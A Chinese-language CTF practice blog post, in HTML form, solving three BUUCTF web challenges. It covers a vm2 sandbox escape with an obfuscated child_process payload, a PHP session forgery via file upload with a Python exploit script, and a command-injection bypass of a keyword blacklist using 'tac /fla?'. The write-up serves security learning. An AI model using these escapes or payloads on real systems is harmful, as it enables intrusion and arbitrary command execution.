@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-web -write up -ctf," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言 继续刷，准备蓝帽，好久没做题了都。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buu练习10">
+<meta property="og:url" content="http://example.com/2022/07/08/buu%E7%BB%83%E4%B9%A010/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言 继续刷，准备蓝帽，好久没做题了都。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-07-08T06:18:18.000Z">
+<meta property="article:modified_time" content="2022-07-08T09:39:03.225Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-web -write up -ctf">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/07/08/buu练习10/"/>
+
+
+
+
+
+  <title>buu练习10 | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/08/buu%E7%BB%83%E4%B9%A010/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">buu练习10</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-07-08T14:18:18+08:00">
+                2022-07-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>继续刷，准备蓝帽，好久没做题了都。</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h1><p>进入题目，发现首页提示run.php并且给了一些实例，我们访问这个php文件得到一个代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( array_key_exists( &quot;code&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;code&#x27; ] != NULL ) &#123;</span><br><span class="line">    $code = $_GET[&#x27;code&#x27;];</span><br><span class="line">    echo eval(code);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>看起来是一个命令执行，还没过滤的，但是这肯定没那么简单，随便传点东西上去试试，比如<code>code=phpinfo();</code>，查看返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ReferenceError: phpinfo is not defined</span><br></pre></td></tr></table></figure>
+
+<p>什么鬼没有定义，结合首页提示我们这真的是php吗，我们可以想到除了php以外，js中也是有eval()这个函数的，那么我们来测试一波：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=Error().stack</span><br></pre></td></tr></table></figure>
+
+<p>看到返回结果，果不其然：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (/app/node_modules/vm2/lib/main.js:219:62) at /app/server.js:51:33 at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at next (/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at /app/node_modules/express/lib/router/index.js:281:22 at Function.process_params (/app/node_modules/express/lib/router/index.js:335:12)</span><br></pre></td></tr></table></figure>
+
+<p>那结合题目很明显这题是一个vm2逃逸，直接套poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&quot;use strict&quot;;</span><br><span class="line">const &#123;VM&#125; = require(&#x27;vm2&#x27;);</span><br><span class="line">const untrusted = &#x27;(&#x27; + function()&#123;</span><br><span class="line">    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`].get_process = f=&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">    try&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;+&#x27;)()&#x27;;</span><br><span class="line">try&#123;</span><br><span class="line">    console.log(new VM().run(untrusted));</span><br><span class="line">&#125;catch(x)&#123;</span><br><span class="line">    console.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试后发现存在过滤用javascript的模版文字绕过。最后poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(function ()&#123;</span><br><span class="line">    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return this.proces`&#125;s`&#125;`)();</span><br><span class="line">    try&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.from(``)).a = 1;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag。</p>
+<h1 id="HFCTF2020-BabyUpload"><a href="#HFCTF2020-BabyUpload" class="headerlink" title="[HFCTF2020]BabyUpload"></a>[HFCTF2020]BabyUpload</h1><p>进来就是代码审计：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_save_path(&quot;/var/babyctf/&quot;);</span><br><span class="line">session_start();</span><br><span class="line">require_once &quot;/flag&quot;;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if($_SESSION[&#x27;username&#x27;] ===&#x27;admin&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=&#x27;/var/babyctf/success.txt&#x27;;</span><br><span class="line">    if(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $_SESSION[&#x27;username&#x27;] =&#x27;guest&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$direction = filter_input(INPUT_POST, &#x27;direction&#x27;);</span><br><span class="line">$attr = filter_input(INPUT_POST, &#x27;attr&#x27;);</span><br><span class="line">$dir_path = &quot;/var/babyctf/&quot;.$attr;</span><br><span class="line">if($attr===&quot;private&quot;)&#123;</span><br><span class="line">    $dir_path .= &quot;/&quot;.$_SESSION[&#x27;username&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">if($direction === &quot;upload&quot;)&#123;</span><br><span class="line">    try&#123;</span><br><span class="line">        if(!is_uploaded_file($_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;]))&#123;</span><br><span class="line">            throw new RuntimeException(&#x27;invalid upload&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path = $dir_path.&quot;/&quot;.$_FILES[&#x27;up_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">        $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">        if(preg_match(&#x27;/(\.\.\/|\.\.\\\\)/&#x27;, $file_path))&#123;</span><br><span class="line">            throw new RuntimeException(&#x27;invalid file path&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir($dir_path, 0700, TRUE);</span><br><span class="line">        if(move_uploaded_file($_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;],$file_path))&#123;</span><br><span class="line">            $upload_result = &quot;uploaded&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            throw new RuntimeException(&#x27;error while saving&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (RuntimeException $e) &#123;</span><br><span class="line">        $upload_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; elseif ($direction === &quot;download&quot;) &#123;</span><br><span class="line">    try&#123;</span><br><span class="line">        $filename = basename(filter_input(INPUT_POST, &#x27;filename&#x27;));</span><br><span class="line">        $file_path = $dir_path.&quot;/&quot;.$filename;</span><br><span class="line">        if(preg_match(&#x27;/(\.\.\/|\.\.\\\\)/&#x27;, $file_path))&#123;</span><br><span class="line">            throw new RuntimeException(&#x27;invalid file path&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(!file_exists($file_path)) &#123;</span><br><span class="line">            throw new RuntimeException(&#x27;file not exist&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        header(&#x27;Content-Type: application/force-download&#x27;);</span><br><span class="line">        header(&#x27;Content-Length: &#x27;.filesize($file_path));</span><br><span class="line">        header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27;.substr($filename, 0, -65).&#x27;&quot;&#x27;);</span><br><span class="line">        if(readfile($file_path))&#123;</span><br><span class="line">            $download_result = &quot;downloaded&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            throw new RuntimeException(&#x27;error while saving&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (RuntimeException $e) &#123;</span><br><span class="line">        $download_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>好长一段，这么长当然得一段段来看。首先是第一段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if($_SESSION[&#x27;username&#x27;] ===&#x27;admin&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=&#x27;/var/babyctf/success.txt&#x27;;</span><br><span class="line">    if(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $_SESSION[&#x27;username&#x27;] =&#x27;guest&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这段比较简单，也是我们能获取flag的核心，只要满足两个条件就可以了：</p>
+<ol>
+<li>session中的username的值要为admin</li>
+<li>存在文件/var/babyctf/success.txt<br>但是默认将我们的session中username的值设置为guest。</li>
+</ol>
+<p>第二段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">if($direction === &quot;upload&quot;)&#123;</span><br><span class="line">    try&#123;</span><br><span class="line">        if(!is_uploaded_file($_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;]))&#123;</span><br><span class="line">            throw new RuntimeException(&#x27;invalid upload&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path = $dir_path.&quot;/&quot;.$_FILES[&#x27;up_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">        $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">        if(preg_match(&#x27;/(\.\.\/|\.\.\\\\)/&#x27;, $file_path))&#123;</span><br><span class="line">            throw new RuntimeException(&#x27;invalid file path&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir($dir_path, 0700, TRUE);</span><br><span class="line">        if(move_uploaded_file($_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;],$file_path))&#123;</span><br><span class="line">            $upload_result = &quot;uploaded&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            throw new RuntimeException(&#x27;error while saving&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (RuntimeException $e) &#123;</span><br><span class="line">        $upload_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>文件上传，过滤了目录穿越，文件名也进行了哈希，不过都没啥用，唯一的作用可以说就是在/var/babyctf/下任意上传文件了，那么我们肯定要通过这个部分上传success.txt。</p>
+<p>第三段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">elseif ($direction === &quot;download&quot;) &#123;</span><br><span class="line">    try&#123;</span><br><span class="line">        $filename = basename(filter_input(INPUT_POST, &#x27;filename&#x27;));</span><br><span class="line">        $file_path = $dir_path.&quot;/&quot;.$filename;</span><br><span class="line">        if(preg_match(&#x27;/(\.\.\/|\.\.\\\\)/&#x27;, $file_path))&#123;</span><br><span class="line">            throw new RuntimeException(&#x27;invalid file path&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(!file_exists($file_path)) &#123;</span><br><span class="line">            throw new RuntimeException(&#x27;file not exist&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        header(&#x27;Content-Type: application/force-download&#x27;);</span><br><span class="line">        header(&#x27;Content-Length: &#x27;.filesize($file_path));</span><br><span class="line">        header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27;.substr($filename, 0, -65).&#x27;&quot;&#x27;);</span><br><span class="line">        if(readfile($file_path))&#123;</span><br><span class="line">            $download_result = &quot;downloaded&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            throw new RuntimeException(&#x27;error while saving&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (RuntimeException $e) &#123;</span><br><span class="line">        $download_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>任意文件下载，同样过滤了目录穿越，可以从/vat/babyctf/中进行任意文件读取。</p>
+<p>php的session默认存储文件名是sess_+PHPSESSID的值，我们先读取cookie中的session并尝试读取：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">direction=download&amp;attr=&amp;filename=sess_73e1e2caaba56997530a478afabf59d0</span><br></pre></td></tr></table></figure>
+<p>看到返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usernames:5:&quot;guest&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>发现有一个不可打印字符，那么就可以判断储存模式是php_binary了。因为这个模式的储存方式是键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值，那么我们就可以根据这个规律伪造session了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usernames:5:&quot;admin&quot;;</span><br><span class="line"></span><br><span class="line">sha256:432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</span><br></pre></td></tr></table></figure>
+
+<p>那么我们只要上传伪造的session文件和success.txt就可以了，直接用exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from io import BytesIO</span><br><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url = &#x27;http://5a0cdaad-fb6e-49f9-99ae-94f44a342d8b.node4.buuoj.cn:81/&#x27;</span><br><span class="line"># 第一步:上传伪造的session文件</span><br><span class="line">files = &#123;&quot;up_file&quot;: (&quot;sess&quot;, BytesIO(&#x27;\x08usernames:5:&quot;admin&quot;;&#x27;.encode(&#x27;utf-8&#x27;)))&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;direction&#x27;:&#x27;upload&#x27;,</span><br><span class="line">    &#x27;attr&#x27;:&#x27;&#x27;</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url, data=data ,files=files)</span><br><span class="line"> </span><br><span class="line"># 第二步:获取后面请求时的session_id</span><br><span class="line">session_id = hashlib.sha256(&#x27;\x08usernames:5:&quot;admin&quot;;&#x27;.encode(&#x27;utf-8&#x27;)).hexdigest()</span><br><span class="line"> </span><br><span class="line"># 第三步:在/var/babyctf/下创建success.txt目录</span><br><span class="line">data1 = &#123;</span><br><span class="line">    &#x27;attr&#x27;: &#x27;success.txt&#x27;,</span><br><span class="line">    &#x27;direction&#x27;: &#x27;upload&#x27;</span><br><span class="line">&#125;</span><br><span class="line">res1 = requests.post(url=url, data=data1, files=files)</span><br><span class="line"> </span><br><span class="line"># 第四步:通过上面获取的session_id发起请求，获取flag</span><br><span class="line">cookie = &#123;</span><br><span class="line">    &#x27;PHPSESSID&#x27;:session_id</span><br><span class="line">&#125;</span><br><span class="line">flag_res = requests.post(url,cookies = cookie)</span><br><span class="line">print(flag_res.text)</span><br></pre></td></tr></table></figure>
+<p>执行获取flag。</p>
+<h1 id="EasyBypass"><a href="#EasyBypass" class="headerlink" title="EasyBypass"></a>EasyBypass</h1><p>同样开门见源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$comm1 = $_GET[&#x27;comm1&#x27;];</span><br><span class="line">$comm2 = $_GET[&#x27;comm2&#x27;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $comm1))</span><br><span class="line">    $comm1 = &quot;&quot;;</span><br><span class="line">if(preg_match(&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;, $comm2))</span><br><span class="line">    $comm2 = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">$flag = &quot;#flag in /flag&quot;;</span><br><span class="line"></span><br><span class="line">$comm1 = &#x27;&quot;&#x27; . $comm1 . &#x27;&quot;&#x27;;</span><br><span class="line">$comm2 = &#x27;&quot;&#x27; . $comm2 . &#x27;&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">$cmd = &quot;file $comm1 $comm2&quot;;</span><br><span class="line">system($cmd);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>真是一题简单的bypass呢（恼怒），这过滤的也太狠了吧。因为file命令打不开文件，只能判别文件的类型，因此我们在comm1中要利用引号和分号来进行命令的控制。</p>
+<p>对比了一下过滤程度，comm1比较少一点，而且分号还在，那就从comm1开刀。</p>
+<p>构建payload，先将引号闭合，接着用分号结束file语句，然后跟上flag读取命令，最后闭合后引号保障不会报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?comm1=&quot;;tac /fla?;&quot;&amp;comm2=1</span><br></pre></td></tr></table></figure>
+<p>GET传入数据获取flag。</p>
